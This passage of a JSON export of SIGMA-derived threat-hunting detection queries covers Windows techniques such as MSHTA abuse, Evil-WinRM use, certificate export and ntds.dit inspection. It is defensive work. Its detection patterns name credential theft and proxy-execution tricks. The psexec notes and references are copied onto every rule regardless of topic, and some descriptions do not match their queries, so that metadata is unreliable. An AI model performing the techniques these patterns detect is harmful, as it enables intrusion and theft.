            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\eventvwr.exe\" and (not (tgt.process.image.path contains \":\\Windows\\System32\\mmc.exe\" or tgt.process.image.path contains \":\\Windows\\System32\\WerFault.exe\" or tgt.process.image.path contains \":\\Windows\\SysWOW64\\WerFault.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 266
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects browsers starting with the remote debugging flags. Which is a technique often used to perform browser injection attacks",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1185"
            ],
            "name": "Browser Started with Remote Debugging",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" --remote-debugging-\" or (tgt.process.image.path contains \"\\firefox.exe\" and tgt.process.cmdline contains \" -start-debugger-server\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 267
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Local accounts, System Owner/User discovery using operating systems utilities",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1033",
                "t1087"
            ],
            "name": "Local Accounts Discovery",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\cmd.exe\" and (tgt.process.cmdline contains \" /c\" and tgt.process.cmdline contains \"dir \" and tgt.process.cmdline contains \"\\Users\\\")) and (not tgt.process.cmdline contains \" rmdir \")) or (((tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\") and tgt.process.cmdline contains \"user\") and (not (tgt.process.cmdline contains \"/domain\" or tgt.process.cmdline contains \"/add\" or tgt.process.cmdline contains \"/delete\" or tgt.process.cmdline contains \"/active\" or tgt.process.cmdline contains \"/expires\" or tgt.process.cmdline contains \"/passwordreq\" or tgt.process.cmdline contains \"/scriptpath\" or tgt.process.cmdline contains \"/times\" or tgt.process.cmdline contains \"/workstations\"))) or ((tgt.process.image.path contains \"\\whoami.exe\" or tgt.process.image.path contains \"\\quser.exe\" or tgt.process.image.path contains \"\\qwinsta.exe\") or (tgt.process.image.path contains \"\\wmic.exe\" and (tgt.process.cmdline contains \"useraccount\" and tgt.process.cmdline contains \"get\")) or (tgt.process.image.path contains \"\\cmdkey.exe\" and tgt.process.cmdline contains \" /l\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 268
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1021"
            ],
            "name": "HackTool - WinRM Access Via Evil-WinRM",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\ruby.exe\" and (tgt.process.cmdline contains \"-i \" and tgt.process.cmdline contains \"-u \" and tgt.process.cmdline contains \"-p \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 269
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the command line executed when TeamViewer starts a session started by a remote host.\nOnce a connection has been started, an investigator can verify the connection details by viewing the \"incoming_connections.txt\" log file in the TeamViewer folder.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1133"
            ],
            "name": "Remote Access Tool - Team Viewer Session Started On Windows Host",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path=\"TeamViewer_Desktop.exe\" and src.process.image.path=\"TeamViewer_Service.exe\" and tgt.process.cmdline contains \"TeamViewer_Desktop.exe --IPCport 5939 --Module 1\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 270
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects calls to cmdlets that are used to export certificates from the local certificate store. Threat actors were seen abusing this to steal private keys from compromised machines.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1552",
                "t1059"
            ],
            "name": "Certificate Exported Via PowerShell",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Export-PfxCertificate \" or tgt.process.cmdline contains \"Export-Certificate \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 271
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects cases in which an ISO files is opend within an archiver like 7Zip or Winrar, which is a sign of phishing as threat actors put small ISO files in archives as email attachments to bypass certain filters and protective measures (mark of web)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1566"
            ],
            "name": "Phishing Pattern ISO in Archive",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\Winrar.exe\" or src.process.image.path contains \"\\7zFM.exe\" or src.process.image.path contains \"\\peazip.exe\") and (tgt.process.image.path contains \"\\isoburn.exe\" or tgt.process.image.path contains \"\\PowerISO.exe\" or tgt.process.image.path contains \"\\ImgBurn.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 272
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Windows Installer service (msiexec.exe) trying to install MSI packages with SYSTEM privilege",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "Always Install Elevated Windows Installer",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((((tgt.process.image.path contains \"\\Windows\\Installer\\\" and tgt.process.image.path contains \"msi\") and tgt.process.image.path contains \"tmp\") or (tgt.process.image.path contains \"\\msiexec.exe\" and (tgt.process.integrityLevel in (\"System\",\"S-1-16-16384\")))) and (tgt.process.user contains \"AUTHORI\" or tgt.process.user contains \"AUTORI\") and (not (src.process.image.path=\"C:\\Windows\\System32\\services.exe\" or (tgt.process.cmdline contains \"\\system32\\msiexec.exe /V\" or src.process.cmdline contains \"\\system32\\msiexec.exe /V\") or src.process.image.path contains \"C:\\ProgramData\\Sophos\\\" or src.process.image.path contains \"C:\\ProgramData\\Avira\\\" or (src.process.image.path contains \"C:\\Program Files\\Avast Software\\\" or src.process.image.path contains \"C:\\Program Files (x86)\\Avast Software\\\") or (src.process.image.path contains \"C:\\Program Files\\Google\\Update\\\" or src.process.image.path contains \"C:\\Program Files (x86)\\Google\\Update\\\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 273
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the creation of a new service using the \"sc.exe\" utility.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1543"
            ],
            "name": "New Service Creation Using Sc.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\sc.exe\" and (tgt.process.cmdline contains \"create\" and tgt.process.cmdline contains \"binPath\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 274
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of Windows binaries from within a WSL instance.\nThis could be used to masquerade parent-child relationships\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1202"
            ],
            "name": "Windows Binary Executed From WSL",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path matches \"[a-zA-Z]:\\\\\\\\\" and tgt.process.image.path contains \"\\\\wsl.localhost\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 275
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects calls to the AtomicTestHarnesses \"Invoke-ATHRemoteFXvGPUDisablementCommand\" which is designed to abuse the \"RemoteFXvGPUDisablement.exe\" binary to run custom PowerShell code via module load-order hijacking.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "RemoteFXvGPUDisablement Abuse Via AtomicTestHarnesses",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Invoke-ATHRemoteFXvGPUDisablementCommand\" or tgt.process.cmdline contains \"Invoke-ATHRemoteFXvGPUDisableme\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 276
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uncommon child processes of Appvlp.EXE\nAppvlp or the Application Virtualization Utility is included with Microsoft Office. Attackers are able to abuse \"AppVLP\" to execute shell commands.\nNormally, this binary is used for Application Virtualization, but it can also be abused to circumvent the ASR file path rule folder\nor to mark a file as a system file.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Uncommon Child Process Of Appvlp.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\appvlp.exe\" and (not (tgt.process.image.path contains \":\\Windows\\SysWOW64\\rundll32.exe\" or tgt.process.image.path contains \":\\Windows\\System32\\rundll32.exe\")) and (not ((tgt.process.image.path contains \":\\Program Files\\Microsoft Office\" and tgt.process.image.path contains \"\\msoasb.exe\") or ((tgt.process.image.path contains \":\\Program Files\\Microsoft Office\" and tgt.process.image.path contains \"\\SkypeSrv\\\") and tgt.process.image.path contains \"\\SKYPESERVER.EXE\") or (tgt.process.image.path contains \":\\Program Files\\Microsoft Office\" and tgt.process.image.path contains \"\\MSOUC.EXE\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 277
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1140",
                "t1218",
                "t1059"
            ],
            "name": "MSHTA Suspicious Execution 01",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\mshta.exe\" and (tgt.process.cmdline contains \"vbscript\" or tgt.process.cmdline contains \".jpg\" or tgt.process.cmdline contains \".png\" or tgt.process.cmdline contains \".lnk\" or tgt.process.cmdline contains \".xls\" or tgt.process.cmdline contains \".doc\" or tgt.process.cmdline contains \".zip\" or tgt.process.cmdline contains \".dll\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 278
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects child processes of \"provlaunch.exe\" which might indicate potential abuse to proxy execution.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Potential Provlaunch.EXE Binary Proxy Execution Abuse",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\provlaunch.exe\" and (not ((tgt.process.image.path contains \"\\calc.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\notepad.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\wscript.exe\") or (tgt.process.image.path contains \":\\PerfLogs\\\" or tgt.process.image.path contains \":\\Temp\\\" or tgt.process.image.path contains \":\\Users\\Public\\\" or tgt.process.image.path contains \"\\AppData\\Temp\\\" or tgt.process.image.path contains \"\\Windows\\System32\\Tasks\\\" or tgt.process.image.path contains \"\\Windows\\Tasks\\\" or tgt.process.image.path contains \"\\Windows\\Temp\\\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 279
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the creation of a new service using powershell.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1543"
            ],
            "name": "New Service Creation Using PowerShell",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"New-Service\" and tgt.process.cmdline contains \"-BinaryPathName\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 280
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious child process of Script Event Consumer (scrcons.exe).",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1047"
            ],
            "name": "Script Event Consumer Spawning Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\scrcons.exe\" and (tgt.process.image.path contains \"\\svchost.exe\" or tgt.process.image.path contains \"\\dllhost.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\msiexec.exe\" or tgt.process.image.path contains \"\\msbuild.exe\"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 281
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of Ditsnap tool, an inspection tool for Active Directory database, ntds.dit.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "PUA - DIT Snapshot Viewer",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\ditsnap.exe\" or tgt.process.cmdline contains \"ditsnap.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
